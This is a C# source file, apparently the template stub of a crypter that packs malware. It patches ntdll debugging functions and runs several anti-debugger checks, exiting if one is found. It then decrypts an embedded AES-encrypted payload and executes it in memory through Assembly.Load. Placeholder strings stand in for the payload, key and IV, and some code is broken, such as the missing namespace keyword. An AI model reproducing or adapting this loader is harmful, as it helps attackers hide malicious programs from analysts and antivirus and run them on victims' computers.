using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Security.Cryptography;
using System.Text;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Reflection;

PackStub
{
    static class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool IsDebuggerPresent();

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr Handle);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CheckRemoteDebuggerPresent(IntPtr Handle, ref bool IsPresent);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string Library);

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetProcAddress(IntPtr Module, string Function);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool WriteProcessMemory(IntPtr ProcHandle, IntPtr BaseAddress, byte[] Buffer, uint size, int NumOfBytes);

        static string fMJUcafeoygb = "DecME";
        static string bPVkaPIHxmHs = "THISISKEY";
        static string fCeZqcYnjRpl = "THISISIV";

        private static string TqMIJUcgsXjVgxqJ(string DataToDecrypt, string KeyToDecryptWith, string IVKeyToDecryptWith)
        {
            byte[] data = Convert.FromBase64String(DataToDecrypt);
            using (SHA256CryptoServiceProvider SHA256 = new SHA256CryptoServiceProvider())
            {
                byte[] keys = SHA256.ComputeHash(UTF8Encoding.UTF8.GetBytes(KeyToDecryptWith));
                using (AesCryptoServiceProvider AES = new AesCryptoServiceProvider() { Key = keys, Mode = CipherMode.CBC, Padding = PaddingMode.PKCS7 })
                {
                    string initVector = IVKeyToDecryptWith;
                    byte[] initVectorBytes = Encoding.ASCII.GetBytes(initVector);
                    AES.IV = initVectorBytes;
                    ICryptoTransform transform = AES.CreateDecryptor();
                    byte[] results = transform.TransformFinalBlock(data, 0, data.Length);
                    string Result = UTF8Encoding.UTF8.GetString(results);
                    return Result;
                }
            }
        }

        private static bool CloseHandleAntiDebug()
        {
            try
            {
                CloseHandle((IntPtr)3735929054L);
                return false;
            }
            catch (Exception ex)
            {
                if (ex.Message == "External component has thrown an exception.")
                    return true;
            }
            return false;
        }

        [STAThread]
        static void Main()
        {
            IntPtr NtdllModule = GetModuleHandle("ntdll.dll");
            IntPtr DbgUiRemoteBreakinAddress = GetProcAddress(NtdllModule, "DbgUiRemoteBreakin");
            IntPtr DbgUiConnectToDbgAddress = GetProcAddress(NtdllModule, "DbgUiConnectToDbg");
            byte[] Int3InvaildCode = { 0xCC };
            WriteProcessMemory(Process.GetCurrentProcess().Handle, DbgUiRemoteBreakinAddress, Int3InvaildCode, 6, 0);
            WriteProcessMemory(Process.GetCurrentProcess().Handle, DbgUiConnectToDbgAddress, Int3InvaildCode, 6, 0);
            IntPtr KernelModule = GetModuleHandle("kernel32.dll");
            IntPtr IsDebuggerPresentAddress = GetProcAddress(KernelModule, "IsDebuggerPresent");
            IntPtr CheckRemoteDebuggerPresentAddress = GetProcAddress(KernelModule, "CheckRemoteDebuggerPresent");
            byte[] Is_IsDebuggerPresentHooked = new byte[1];
            Marshal.Copy(IsDebuggerPresentAddress, Is_IsDebuggerPresentHooked, 0, 1);
            byte[] Is_CheckRemoteDebuggerPresentHooked = new byte[1];
            Marshal.Copy(CheckRemoteDebuggerPresentAddress, Is_CheckRemoteDebuggerPresentHooked, 0, 1);
            bool IsPresent = false;
            CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref IsPresent);
            if (IsDebuggerPresent() || Debugger.IsAttached || Debugger.IsLogging() || IsPresent || CloseHandleAntiDebug()) { Environment.Exit(0); }
            else
            {
                try
                {
                    StringBuilder DecryptEncryptionKey = new StringBuilder();
                    for (int c = 0; c < bPVkaPIHxmHs.Length; c++)
                        DecryptEncryptionKey.Append((char)((uint)bPVkaPIHxmHs[c] ^ (uint)Convert.FromBase64String("decryptkeyencryption")[c % 4]));
                    StringBuilder DecryptIV = new StringBuilder();
                    for (int c = 0; c < fCeZqcYnjRpl.Length; c++)
                        DecryptIV.Append((char)((uint)fCeZqcYnjRpl[c] ^ (uint)Convert.FromBase64String("decryptkeyiv")[c % 4]));
                    string sXQDBlJfKdPY = TqMIJUcgsXjVgxqJ(fMJUcafeoygb, DecryptEncryptionKey.ToString(), DecryptIV.ToString());
                    byte[] AzSLFXWvNQgp = Convert.FromBase64String(sXQDBlJfKdPY.Replace(".", "A").Replace("*", "B").Replace("_", @"S"));
                    Assembly lnEFUxxAooHc = Assembly.Load(AzSLFXWvNQgp);
                    lnEFUxxAooHc.EntryPoint.Invoke(null, null);
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
            }
        }
    }
}